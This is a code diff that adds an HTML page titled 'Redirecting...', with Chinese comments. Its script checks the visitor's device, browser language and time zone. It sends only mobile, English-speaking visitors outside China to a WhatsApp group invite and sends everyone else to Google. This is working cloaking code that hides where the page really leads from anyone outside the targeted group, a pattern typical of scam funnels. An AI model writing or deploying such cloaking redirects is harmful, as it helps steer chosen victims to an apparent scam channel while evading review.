@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        (function() {
+            // ========== 获取关键信息 ==========
+            
+            // 1. 检测是否为手机端
+            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            // 2. 获取浏览器语言
+            var lang = navigator.language || navigator.userLanguage || '';
+            var langs = navigator.languages || [];
+            
+            // 3. 获取时区
+            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            
+            // ========== 判断条件 ==========
+            
+            // 4. 是否为英文
+            var isEnglish = lang.substr(0, 2).toLowerCase() === 'en';
+            
+            // 5. 是否为中国时区
+            var chinaTZ = ['Asia/Shanghai', 'Asia/Chongqing', 'Asia/Harbin', 'Asia/Urumqi'];
+            var isChinaTZ = chinaTZ.indexOf(tz) !== -1;
+            
+            // 6. 是否为中文语言
+            var isChineseLang = lang.startsWith('zh') || 
+                                langs.some(function(l) { return l.startsWith('zh'); });
+            
+            // ========== 最终决策 ==========
+            
+            // 目标：手机端 + 英文 + 不是中国时区 + 不是中文语言
+            var shouldRedirect = isMobile && isEnglish && !isChinaTZ && !isChineseLang;
+            
+            // ========== 跳转执行 ==========
+            
+            var targetUrl = "https://chat.whatsapp.com/GzlyDzWSFu69fQfxaJbk0m";
+            var fallbackUrl = "https://www.google.com";
+            
+            window.location.replace(shouldRedirect ? targetUrl : fallbackUrl);
+        })();
+    </script>
+</body>
+</html>
